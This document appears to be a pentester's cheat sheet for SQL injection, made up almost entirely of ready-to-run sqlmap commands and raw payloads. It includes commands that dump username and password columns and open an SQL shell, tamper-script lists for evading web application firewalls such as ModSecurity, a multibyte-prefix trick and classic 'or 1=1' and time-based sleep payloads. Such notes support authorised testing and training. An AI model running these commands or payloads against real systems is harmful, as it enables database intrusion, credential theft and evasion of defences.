Use Prefix and Suffix for more challenging attacks
---------------------------------------------
```
# See example 9 https://pentesterlab.com/exercises/web_for_pentester_II/course
# Example Chinese char set https://www.fileformat.info/info/charset/GBK/list.htm
sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysql
```

SQLite sample 
-------------
```
# NOTE: Notice the -D parameter is "SQLite_masterdb", this appears to be the default database for SQLite. 
# Other possible -D parameter could be "main"
sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump

## Get --sql-shell
sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump --sql-shell

# List tables
SELECT name FROM sqlite_master WHERE type='table';
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

# Show tables and columns
SELECT sql FROM sqlite_master
```

SQLMap Tamper Data
-------------
```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```
General Tamper Data
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MSSQL
```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MYSQL
```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
SQLInjection Basic Stuff
-------------
```
' or 1=1 --
‘ or 1=1 or ‘1’=’1
# If single quotes are blocked try delimiting them
/‘ or 1=1 or ‘1’=’1
/' or 1=1 --
'"
105 OR 1=1
" or ""="
'%2b(select*from(select(sleep(20)))a)%2b'
```
Sqlmap quick cheat sheet
-------------
```
sqlmap -u ${url}
sqlmap -u ${url} --dbs
sqlmap -u ${url} -D ${database} --tables
sqlmap -u ${url} -D ${database} -T ${table} --columns
sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump
```
